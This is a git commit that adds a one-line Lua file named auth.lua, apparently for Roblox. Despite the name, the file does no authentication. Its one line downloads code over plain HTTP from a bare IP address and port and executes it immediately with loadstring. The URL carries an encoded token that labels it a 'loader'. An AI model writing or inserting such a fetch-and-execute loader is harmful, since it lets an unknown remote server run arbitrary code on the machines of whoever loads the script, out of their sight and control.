99a9ace7e7880236533fd6c15485dc19a782ae6d
randomaccount <87091634+yxkal999YT@users.noreply.github.com>
2026-02-13 19:44:36 -0500

    Create auth.lua

---
+++ auth.lua
@@ -0,0 +1,1 @@
+loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6Ijk1MTMyZGI4LWY1MWItNGUxZS1iYjc2LTA1ZTZlNzI1NTkyZCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJldmVudCJ9fQ"))()
